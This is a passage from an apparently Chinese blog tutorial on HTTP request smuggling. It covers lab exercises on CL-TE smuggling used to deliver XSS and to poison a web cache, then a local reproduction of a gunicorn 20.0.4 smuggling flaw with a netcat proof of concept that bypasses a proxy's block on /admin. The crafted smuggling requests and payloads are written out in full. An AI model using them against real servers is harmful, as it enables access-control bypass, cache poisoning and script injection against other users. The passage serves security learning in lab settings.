15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这个场景包含前端和后端服务器，并且前端服务器不支持Chunked-Encoding。应用程序在User-Agent这个标头含有反射型XSS漏洞。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>目标是让用户收到一个alert(1)的弹框。</p></blockquote>\n<p>进入靶场后抓包，<br>看一下UA处，先发包，观察一下他的包裹方式，既然题目提示这里存在XSS，那么我们就先观察一下他是如何闭合的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149588.png\" alt=\"在这里插入图片描述\"><br>可以发现结尾是<code>&quot;&gt;</code>，若存在XSS，我们通过构造恶意语句应该是可以触发XSS的，我们先尝试一下修改<code>User-Agent</code>，看是否能够触发xss<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149676.png\" alt=\"在这里插入图片描述\"><br>成功触发XSS，因为前端不支持<code>chunked</code>编码方式，那么我们这里就可以尝试一下去构造<code>CL-TE</code>种类的请求走私，构造XSS，恶意代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">154</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>post<span class=\"token operator\">?</span>postId<span class=\"token operator\">=</span><span class=\"token number\">5</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> a\"<span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span>\\r\\n\n\\r\\n\nx<span class=\"token operator\">=</span><span class=\"token number\">1</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149835.png\" alt=\"在这里插入图片描述\"><br>第一次访问正常，接下来用户去访问界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149885.png\" alt=\"在这里插入图片描述\"><br>成功触发了XSS，这个过程是如何实现的呢<br>前端代理服务器：接收的是<code>CL</code>，然后检测内容没有什么问题，传输给后端服务器</p>\n<p>后端服务器：接收的是<code>TE</code>，接收到0后停止接收，而下面的还没被接收，被认为是另一个独立的请求，当此时有一个用户去访问界面时，这个请求就会发出，触发XSS</p>\n<h2 id=\"请求走私实现Web缓存投毒\"><a href=\"#请求走私实现Web缓存投毒\" class=\"headerlink\" title=\"请求走私实现Web缓存投毒\"></a>请求走私实现Web缓存投毒</h2><p>学习之前我们首先需要了解一下什么是Web缓存</p>\n<p>WEB缓存就是指网站的静态文件，比如图片、CSS、JS等，在网站访问的时候，服务器会将这些文件缓存起来，以便下次访问时直接从缓存中读取，不需要再次请求服务器。</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149964.png\" alt=\"在这里插入图片描述\"><br>如上图所示，假设小紫小黄小绿都在服务器划分的同一批特定请求中，那么小紫一开始访问服务器时，经过缓存键X-Cache: Miss的判定，是首次访问，所以直接连接到Server服务器，而其后的小黄、小绿再次访问相同的文件时就会被判定为X-Cache: Hit，即只需连接Cache缓存服务器，不再连接到Server服务器，借此减少了Server服务器的运行负荷。</p>\n<p>这个正常情况下的话无疑是很好的，但如果被黑客利用，这个就会造成一些不好的影响，比如第一个人改了一些包，发送到后端，导致后端返回一些恶意数据，xss这种等等，同时由于缓存机制，后续的其他用户访问此界面时会加载这个恶意缓存，此时就造成了Web缓存投毒。</p>\n<p>接下来从题目中进行进一步理解。</p>\n<p>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。前端服务器被配置为缓存某些响应。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>为了解决实验室问题，请执行导致缓存中毒的请求走私攻击，以便随后对 JavaScript 文件的请求接收到对漏洞利用服务器的重定向。中毒的缓存应该发出警报document.cookie</p></blockquote>\n<p>（经本地测试，这里弹cookie只有弹窗，但无内容，可能是因为cookie过长，所以这里采用弹1来演示缓存投毒）<br>进入环境后抓包，我们首先来验证一下是否存在请求走私漏洞，本题的描述是前端不支持分块编码，那这里的话应该就是<code>CL-TE</code>种类的请求走私漏洞，我们构造一个恶意代码试下能否实现请求走私</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">135</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>post<span class=\"token operator\">/</span>next<span class=\"token operator\">?</span>postId<span class=\"token operator\">=</span><span class=\"token number\">3</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> quan9i<span class=\"token operator\">.</span>top\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span>\\r\\n\n\\r\\n\nx<span class=\"token operator\">=</span><span class=\"token number\">1</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149975.png\" alt=\"在这里插入图片描述\"><br>第一次访问正常，再次访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149158.png\" alt=\"在这里插入图片描述\"><br>302，并跳转到了我们构造的URL中，说明存在<code>CL-TE</code>请求走私，接下来找一个利用点(在靶场中存在的js文件就可以)，然后我们构造一个恶意代码，让下一个请求指向一个xss语句，再将这个利用点发出，这个时候就可以触发我们的xss语句<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149241.png\" alt=\"在这里插入图片描述\"><br>在环境中我们发现了<code>tracking.js</code>这个文件，那么我们就可以让他重定向到xss语句，这样访问靶场的话就会触发，这个时候问题又来了，xss语句怎么搞呢，我们其实只需要让他定向到一个有恶意xss语句的界面就可以，这个时候我们看见靶场里提供了一个工具<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149353.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149388.png\" alt=\"在这里插入图片描述\"><br>我们修改路径为<code>post</code>，内容为<code>alert(1)</code>，这时候我们利用<code>CL-TE</code>请求走私就可以将下一请求指向这个<code>POST</code>路径，那结合刚刚的js文件，就可以触发xss<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149410.png\" alt=\"在这里插入图片描述\"><br>这个时候访问正常，接下来正常情况就是访问到我们构造的恶意xss了，此时我们get发包，将js语句发出去<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149441.png\" alt=\"在这里插入图片描述\"><br>成功重定向，可以看到这里指向的是我们构造的恶意xss语句，访问一下也可以看出来<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149599.png\" alt=\"在这里插入图片描述\"><br>此时去访问靶场，就可以触发xss，请求走私投毒成功<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149732.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149765.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"走私攻击实例\"><a href=\"#走私攻击实例\" class=\"headerlink\" title=\"走私攻击实例\"></a>走私攻击实例</h1><h2 id=\"gunicorn-20-0-4-请求走私漏洞\"><a href=\"#gunicorn-20-0-4-请求走私漏洞\" class=\"headerlink\" title=\"gunicorn 20.0.4 请求走私漏洞\"></a>gunicorn 20.0.4 请求走私漏洞</h2><p>在复现漏洞之前，先简述一下其漏洞成因。</p>\n<p>在文件<code>/gunicorn/http/message.py</code>中存在函数<code>set_body_reader</code>，这个函数通过请求头来确定请求正文的大小，如果存在请求头中存在<code>Sec-Websocket-Key1</code>，则指定这里的请求内容长度为8。<br>如果 gunicorn 位于代理后面并使用持久连接与其通信（HTTP 1.1 中的默认设置），就会造成这个请求走私漏洞。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149774.png\" alt=\"在这里插入图片描述\"><br>现有如下请求发送到从<code>Internet</code>发送到<code>Proxy</code>处</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">48</span>\nSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\n\nxxxxxxxxGET <span class=\"token operator\">/</span>other <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>Proxy</code>代理代理看到<code>Content-Length: 48</code>，认为数据没有问题，然后将内容传输给后端<code>gunicorn</code>处，当请求到达<code>gunicorn</code>处时，他看到<code>Sec-Websocket-Key1</code>时，只会读取八个字符，也就是后面的<code>xxxxxxxx</code>，此时这部分代码还在缓冲区</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>other <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>由于<code>proxy</code>代理和 <code>gunicorn</code> 使用 <code>HTTP-keep-alive</code> 通信，<code>gunicorn</code> 将继续通过与下一个请求相同的 TCP 连接读取这部分数据。 因此，这部分数据发生了请求走私（与CL-TE类请求走私漏洞类似）。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>环境搭建的话，有师傅已经搭建好了，然后这里需要简单说明一下。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注：这个师傅搭建的9999端口是haproxy代理，5000端口是gunicorn业务<br>其实也就是说，9999端口是前端代理服务器，5000端口是后端服务器（原站）</p></blockquote>\n<p>具体环境搭建代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/cckuailong/gunicorn_request_smuggling</span>\n<span class=\"token number\">2</span>、cd gunicorn_request_smuggling\n<span class=\"token number\">3</span>、docker<span class=\"token operator\">-</span>compose up <span class=\"token operator\">--</span>build<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149814.png\" alt=\"在这里插入图片描述\"><br>这个时候环境就搭建好了。</p>\n<p>gunicorn正常的响应：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$ curl http<span class=\"token punctuation\">:</span><span class=\"token comment\">//localhost:5000/</span>\n<span class=\"token class-name type-declaration\">INDEX</span>\n$ curl http<span class=\"token punctuation\">:</span><span class=\"token comment\">//localhost:5000/forbidden</span>\n<span class=\"token class-name type-declaration\">FORBIDDEN</span>\n$ curl http<span class=\"token punctuation\">:</span><span class=\"token comment\">//localhost:5000/admin</span>\n<span class=\"token constant\">ADMIN</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149822.png\" alt=\"在这里插入图片描述\"><br>haproxy代理正常的响应</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$ curl http<span class=\"token punctuation\">:</span><span class=\"token comment\">//localhost:9999/</span>\n<span class=\"token class-name type-declaration\">INDEX</span>\n$ curl http<span class=\"token punctuation\">:</span><span class=\"token comment\">//localhost:9999/forbidden</span>\n<span class=\"token class-name type-declaration\">FORBIDDEN</span>\n$ curl http<span class=\"token punctuation\">:</span><span class=\"token comment\">//localhost:9999/admin</span>\n<span class=\"token constant\">FORBIDDEN</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149960.png\" alt=\"在这里插入图片描述\"><br>接下来我们尝试一下通过请求走私访问<code>gunicorn</code>的<code>admin</code>文件</p>\n<p>Poc如下<br>前端代理服务器认为这是两个请求，即</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> localhost\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">68</span>\nSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\n\nxxxxxxxxGET <span class=\"token operator\">/</span>admin <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> localhost\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">35</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>和</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> localhost<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token operator\">-</span>en <span class=\"token string double-quoted-string\">\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 68\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 35\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n\"</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">nc</span> localhost <span class=\"token number\">9999</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149054.png\" alt=\"在这里插入图片描述\"><br>可以看到成功访问到了禁止访问的admin界面并获取到了内容。<br>对这个Poc进行一下拆分，他是这个样子的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">68</span>\\r\\n\nSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\\r\\n\n\\r\\n\n\\r\\n\nxxxxxxxxGET <span class=\"token operator\">/</span>admin <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">35</span>\\r\\n\n\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个的话如同我们上面所说，类似于<code>CL-TE</code>，<code>gunicorn</code>认为这是两个请求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">68</span>\\r\\n\nSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\\r\\n\n\\r\\n\n\\r\\n\nxxxxxxxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>和</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>admin <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> 